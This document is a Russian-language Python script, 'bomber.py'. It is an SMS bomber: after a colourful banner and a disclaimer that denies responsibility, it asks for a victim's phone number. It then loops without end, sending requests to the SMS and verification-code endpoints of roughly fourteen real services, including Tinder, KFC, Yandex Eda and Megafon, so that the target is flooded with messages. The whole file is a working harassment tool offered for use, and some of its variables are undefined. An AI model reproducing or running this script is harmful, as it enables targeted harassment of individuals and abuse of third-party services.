import sys, os, time, requests, random
from colorama import Fore, Back, Style

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1)

def Banner():
    print(Fore.RED + Back.BLACK + '██╗  ██╗██████╗  █████╗ ███╗   ███╗██████╗')
    print(Fore.GREEN + Back.BLACK + '██║ ██╔╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗')
    print(Fore.BLUE + Back.BLACK + '█████═╝ ██████╦╝██║  ██║██╔████╔██║██████╦╝')
    print(Fore.YELLOW + Back.BLACK + '██╔═██╗ ██╔══██╗██║  ██║██║╚██╔╝██║██╔══██╗')
    print(Fore.CYAN + Back.BLACK + '██║ ╚██╗██████╦╝╚█████╔╝██║ ╚═╝ ██║██████╦╝')
    print(Fore.RED + Back.BLACK +  '╚═╝  ╚═╝╚═════╝ ╚════╝ ╚═╝     ╚═╝╚═════╝\n')
    print(Style.RESET_ALL)

def Bomber(phone):
    Banner()
    try:
        print(Fore.RED + "(CTRL-C - Выход      ENTER - Старт)")
        print(Fore.GREEN + " __________________________________")
        print(Fore.BLUE + "|██████████████████████████████████|")
        print(Fore.YELLOW + "|█|                              |█|")
        print(Fore.CYAN + "|█| Атакуемый номер: +" + phone + "|█|")
        print(Fore.RED + "|█|                              |█|")
        print(Fore.GREEN + "|█|            Старт?            |█|")
        print(Fore.BLUE + "|█|                              |█|")
        print(Fore.YELLOW + "|█|______________________________|█|")
        print(Fore.CYAN + "|██████████████████████████████████|")
        print(Fore.RED + "|█[CTRL-C]█████████████████[ENTER]█|")
        print(Fore.GREEN + "|██████████████████████████████████|")
        input()
    except:
        os.system("clear"); Banner(); print("Выход...\n"); exit()
    os.system("clear")
    Banner()
    print(Fore.GREEN + " __________________________________")
    print(Fore.BLUE + "|██████████████████████████████████|")
    print(Fore.YELLOW + "|█|                              |█|")
    print(Fore.CYAN + "|█| Атакуемый номер: +" + phone + "|█|")
    print(Fore.RED + "|█|                              |█|")
    print(Fore.GREEN + "|█|           Работаю...         |█|")
    print(Fore.BLUE + "|█|                              |█|")
    print(Fore.YELLOW + "|█|______________________________|█|")
    print(Fore.CYAN + "|██████████████████████████████████|")
    print(Fore.RED + "|█[CTRL-C]█████████████████[ENTER]█|")
    print(Fore.GREEN + "|██████████████████████████████████|")
    while True:
        try:
            requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
        except: pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        except: pass
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        except: pass
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
        except: pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        except: pass
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        except: pass
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        except: pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        except: pass
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except: pass
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})
        except: pass
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": phone, "deliveryOption": "sms"})
        except: pass
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
        except: pass
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
        except: pass
        try:
            requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":phone,"password":passmegafon})
        except: pass
Banner()
slowprint("Утилита предоставлена с целью ознакомения.\nАвтор не несет ответственности за ущерб нанесённый данной утилитой.\nНажмите Enter чтобы продолжить...")
input()
os.system("clear")
Banner()
try:
    phone = sys.argv[1]
except:
    slowprint("Введите номер телефона")
    phone = input("$ ./bomber.py +")
if phone[0] == '+':
	phone = phone[1:]
elif phone[0] == '8':
	phone = '7' + phone[1:]
elif phone[0] == '9':
	phone = '7' + phone
os.system("clear")
slowprint("Начата атака на номер " + phone)

_name = ''
for x in range(12):
	name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	passmegafon = random.choice(list('123456789'))

_phone9 = phone[1:]
iteration = 0

Bomber(phone)
